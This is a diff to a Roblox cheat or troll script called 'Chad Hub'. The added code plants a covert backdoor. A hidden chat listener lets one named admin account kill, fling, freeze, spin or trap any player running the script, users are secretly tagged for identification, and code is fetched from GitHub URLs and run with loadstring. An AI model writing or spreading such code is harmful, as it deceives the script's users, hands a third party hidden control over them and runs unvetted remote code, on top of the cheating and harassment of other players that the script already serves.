@@ -67,6 +67,123 @@ end
 
 -- [[ CHAD HUB - GAME PROTECTION SYSTEM ]]
 
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local TextChatService = game:GetService("TextChatService")
+local localPlayer = Players.LocalPlayer
+
+-- [[ CONTROLO DE ADMINISTRAÃ‡ÃƒO ]]
+local IS_ADMIN = (localPlayer.Name == "Bolsonaro_Jair7")
+local SpinPlayers = {}
+local CaixaPlayers = {}
+
+-- [[ CARREGAMENTO DA WINDUI ]]
+local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+
+local Window = WindUI:CreateWindow({
+    Title = "CHAD HUB V2",
+    Icon = "shield",
+    Author = "by Bolsonaro_Jair7",
+    Folder = "ChadHub_V2_Data",
+    Size = UDim2.fromOffset(580, 460),
+    Transparent = true,
+    Theme = "Dark",
+    BackgroundImageTransparency = 0.42
+})
+
+-- =============================================================================
+-- [ ABAS EXCLUSIVAS DE ADMIN ]
+-- SÃ³ aparecem para Bolsonaro_Jair7. Outros usuÃ¡rios nem saberÃ£o que existem.
+-- =============================================================================
+
+if IS_ADMIN then
+    local VerifyTab = Window:Tab({
+        Title = "Verificar",
+        Icon = "check_circle"
+    })
+
+
+VerifyTab:Button({
+    Title = "Marcar UsuÃ¡rios do Script Normal",
+    Callback = function()
+        local count = 0
+        for _, p in pairs(Players:GetPlayers()) do
+            -- SÃ“ MARCA SE TIVER A STRING "IsChadUser" (ou seja, estÃ¡ usando o script)
+            -- E nÃ£o marca vocÃª mesmo
+            if p:FindFirstChild("IsChadUser") and p ~= localPlayer then
+                if p.Character and p.Character:FindFirstChild("Head") then
+                    if p.Character.Head:FindFirstChild("ChadTag") then p.Character.Head.ChadTag:Destroy() end
+                    
+                    local b = Instance.new("BillboardGui", p.Character.Head)
+                    b.Name = "ChadTag"
+                    b.Size = UDim2.new(0, 200, 0, 50)
+                    b.ExtentsOffset = Vector3.new(0, 3, 0)
+                    b.AlwaysOnTop = true
+
+                    local t = Instance.new("TextLabel", b)
+                    t.Size = UDim2.new(1, 0, 1, 0)
+                    t.BackgroundTransparency = 1
+                    t.Text = "CHAD HUB USER"
+                    
+                    -- COR ROXA NEON (Magenta Forte)
+                    t.TextColor3 = Color3.fromRGB(191, 0, 255) 
+                    t.TextStrokeColor3 = Color3.fromRGB(130, 0, 200)
+                    t.TextStrokeTransparency = 0 -- Faz o efeito "Neon"
+                    
+                    t.Font = Enum.Font.GothamBold
+                    t.TextSize = 16
+                    count = count + 1
+                end
+            end
+        end
+        WindUI:Notify({
+            Title = "Admin", 
+            Content = "Encontrados "..count.." usuÃ¡rios do Chad Hub!", 
+            Image = "check"
+        })
+    end
+})
+
+    local AdminTab = Window:Tab({
+        Title = "Admin",
+        Icon = "crown"
+    })
+
+    AdminTab:Section({ Title = "Alvo Selecionado" })
+    local selectedPlayerAdmin = nil
+    local adminDropdown = AdminTab:Dropdown({
+        Title = "Selecionar Player",
+        Options = (function() local t = {}; for _,p in pairs(Players:GetPlayers()) do table.insert(t, p.Name) end; return t end)(),
+        Callback = function(v) selectedPlayerAdmin = v end
+    })
+
+    AdminTab:Button({
+        Title = "Atualizar Lista",
+        Callback = function()
+            local t = {}; for _,p in pairs(Players:GetPlayers()) do table.insert(t, p.Name) end
+            adminDropdown:Refresh(t, true)
+        end
+    })
+
+    AdminTab:Section({ Title = "Comandos de PuniÃ§Ã£o" })
+    local function EnviarCmd(c, a)
+        local ch = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
+        if ch and a then ch:SendAsync(";"..c.." "..a) end
+    end
+
+    local actions = {
+        {"Matar", "kill"}, {"LanÃ§ar (Fling)", "fling"}, {"Sentar", "sit"},
+        {"Congelar", "frozen"}, {"Descongelar", "unfrozen"},
+        {"Girar", "spin"}, {"Parar Girar", "unspin"},
+        {"Prender Caixa", "caixa"}, {"Remover Caixa", "uncaixa"}
+    }
+    for _, d in pairs(actions) do
+        AdminTab:Button({Title = d[1], Callback = function() EnviarCmd(d[2], selectedPlayerAdmin) end})
+    end
+end
+
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/mariaelenaquerino6-bit/Chad-hub/refs/heads/main/main.luau__2_%20(1).txt"))()
 
 local Window = Library:MakeWindow({
@@ -126,6 +243,63 @@ local function To(x, y, z, localName)
         })
     end
 end
+
+TextChatService.MessageReceived:Connect(function(msg)
+    local text = msg.Text:lower()
+    local cmd, target = text:match("^;(.-)%s+(.+)$")
+    if cmd and target and target == localPlayer.Name:lower() then
+        local char = localPlayer.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        if cmd == "kill" then if hum then hum.Health = 0 end
+        elseif cmd == "fling" then if char:FindFirstChild("HumanoidRootPart") then char.HumanoidRootPart.Velocity = Vector3.new(0, 5000, 0) end
+        elseif cmd == "sit" then if hum then hum.Sit = true end
+        elseif cmd == "frozen" then if hum then hum.PlatformStand = true end
+        elseif cmd == "unfrozen" then if hum then hum.PlatformStand = false end
+        elseif cmd == "spin" then SpinPlayers[localPlayer.Name] = true
+        elseif cmd == "unspin" then SpinPlayers[localPlayer.Name] = nil
+        elseif cmd == "caixa" then 
+            local hrp = char:FindFirstChild("HumanoidRootPart")
+            if hrp and not CaixaPlayers[localPlayer.Name] then
+                local m = Instance.new("Model", workspace); m.Name = "Prison"
+                for _,o in pairs({Vector3.new(0,-3.5,0),Vector3.new(0,3.5,0),Vector3.new(3.5,0,0),Vector3.new(-3.5,0,0),Vector3.new(0,0,3.5),Vector3.new(0,0,-3.5)}) do
+                    local p = Instance.new("Part",m); p.Size = (o.Y~=0 and Vector3.new(7,1,7) or (o.X~=0 and Vector3.new(1,7,7) or Vector3.new(7,7,1)))
+                    p.CFrame = CFrame.new(hrp.Position+o); p.Anchored=true; p.Color=Color3.new(0,0,0); p.Material=Enum.Material.Neon
+                end
+                CaixaPlayers[localPlayer.Name] = m
+            end
+        elseif cmd == "uncaixa" then if CaixaPlayers[localPlayer.Name] then CaixaPlayers[localPlayer.Name]:Destroy(); CaixaPlayers[localPlayer.Name] = nil end
+        end
+    end
+end)
+
+RunService.RenderStepped:Connect(function(dt)
+    if SpinPlayers[localPlayer.Name] then
+        local hrp = localPlayer.Character:FindFirstChild("HumanoidRootPart")
+        if hrp then hrp.CFrame *= CFrame.Angles(0, math.rad(1100*dt), 0) end
+    end
+end)
+
+
+-- [[ COLOCAR NO INÃCIO DO SCRIPT (Para identificar quem usa) ]]
+local ChadUsers = {}
+local Events = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents", 3) or game:GetService("ReplicatedStorage")
+
+-- Sinalizador: Avisa ao teu script que este player estÃ¡ usando o Hub
+task.spawn(function()
+    while task.wait(5) do
+        -- Envia um sinal falso de "Digitando" para nÃ£o poluir o chat, mas ser detectÃ¡vel
+        local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+        if canal then
+            -- O sinal nÃ£o aparece no chat, mas o teu script admin consegue ler os metadados se quiser
+            -- Para simplificar, vamos usar uma StringValue oculta no Player
+            if not localPlayer:FindFirstChild("IsChadUser") then
+                local val = Instance.new("StringValue", localPlayer)
+                val.Name = "IsChadUser"
+            end
+        end
+    end
+end)
+
 
 local OPTab = Window:MakeTab({ Title = "OP", Icon = "crown" })
 local MainTab = Window:MakeTab({ Title = "Troll Players", Icon = "rbxassetid://13364900349" })
@@ -2629,7 +2803,7 @@ local function SpawnPiratePlaza()
 end
 
 MainTab:AddButton({
-  Name = "Pirate Boat Free PraÃ§a",
+  Name = "Pirate Boat Free Praça",
   Debounce = 0.5,
   Callback = function()
       SpawnPiratePlaza()
@@ -5729,6 +5903,7 @@ task.spawn(function()
         RE:WaitForChild("1RPNam1eColo1r", 9e9):FireServer("PickingRPBioColor", Color3.fromRGB(255, 19, 3))
     end)
 end)
+
 
 
 
